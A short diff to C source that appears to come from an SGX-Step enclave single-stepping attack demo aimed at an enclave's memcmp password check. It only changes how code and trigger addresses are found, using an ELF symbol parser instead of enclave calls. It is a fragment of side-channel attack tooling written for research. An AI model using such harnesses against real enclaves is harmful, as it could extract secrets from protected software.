@@ -6,6 +6,7 @@
 #include "libsgxstep/cpu.h"
 #include "libsgxstep/pt.h"
 #include "libsgxstep/sched.h"
+#include "libsgxstep/elf_parser.h"
 #include "libsgxstep/enclave.h"
 #include "libsgxstep/debug.h"
 #include "libsgxstep/config.h"
@@ -177,8 +178,8 @@ void attacker_config_runtime(void)
 /* Provoke page fault on enclave entry to initiate single-stepping mode. */
 void attacker_config_page_table(void)
 {
-    SGX_ASSERT( get_memcmp_adrs( eid, &code_adrs) );
-    SGX_ASSERT( get_trigger_adrs( eid, &trigger_adrs) );
+    code_adrs = get_symbol_offset("my_memcmp") + get_enclave_base();
+    trigger_adrs = get_symbol_offset("trigger_page") + get_enclave_base();
     info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);
 
     ASSERT( pte_encl    = remap_page_table_level( code_adrs, PTE) );
@@ -217,6 +218,7 @@ int main( int argc, char **argv )
     SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );
 
     /* 1. Setup attack execution environment. */
+    register_symbols("./Enclave/encl.so");
     attacker_config_runtime();
     attacker_config_page_table();
     register_aep_cb(aep_cb_func);
